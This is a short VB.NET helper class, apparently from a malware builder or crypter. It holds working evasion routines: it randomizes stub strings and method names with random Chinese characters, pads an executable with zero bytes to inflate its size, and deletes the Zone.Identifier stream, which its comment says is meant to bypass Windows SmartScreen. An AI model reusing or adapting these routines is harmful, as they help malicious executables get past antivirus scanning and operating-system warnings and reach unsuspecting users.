
Imports System.Runtime.InteropServices

Public Class Helper


    'Create random character to randomize stub's strings and methods
    Public Shared rand As New Random()
    Public Shared Function Randomi(ByVal lenght As Integer) As String

        Dim Chr As String = "顾氏家族的成泽是顾商城公司的首席执行官顾太太希望她的生物孙子顾金羽接管公司顾成泽的任务是引导合法的继承人成为名受人尊敬的商"
        Dim sb As New Text.StringBuilder()
        For i As Integer = 1 To lenght
            Dim idx As Integer = rand.Next(0, Chr.Length)
            sb.Append(Chr.Substring(idx, 1))
        Next
        Return sb.ToString
    End Function


    'Increase file size by adding empty bytes [0] at the end of the file
    Public Shared Sub Pumper(ByVal Path As String)
        Try
            Dim filesize As Double = Val(Main.numPump.Value)
            filesize = filesize * 1024
            Dim filetemp = IO.Path.GetTempPath + "\Lime-Temp-File.exe"
            IO.File.Copy(Path, filetemp, True)
            Dim filetopump = IO.File.OpenWrite(filetemp)
            Dim size = filetopump.Seek(0, IO.SeekOrigin.[End])
            While size < filesize
                filetopump.WriteByte(0)
                size += 1
            End While
            filetopump.Close()
            IO.File.Delete(Path)
            IO.File.Move(filetemp, Path)
        Catch ex As Exception
            MsgBox(ex.Message)
        End Try
    End Sub



    'Remove the output zoneIden. beter for bypass windows smart screen, file must be in zip file if you uploaded it.
    <DllImport("kernel32.dll", CharSet:=CharSet.Auto, BestFitMapping:=False, ThrowOnUnmappableChar:=True, SetLastError:=True)>
    Public Shared Function DeleteFile(<MarshalAs(UnmanagedType.LPTStr)> ByVal filepath As String
        ) As <MarshalAs(UnmanagedType.Bool)> Boolean
    End Function
    Public Shared Sub DeleteZoneIdentifier(ByVal filePath As String)
        Try
            DeleteFile(filePath + ":Zone.Identifier")
        Catch ex As Exception
            MsgBox(ex.Message)
        End Try
    End Sub


End Class




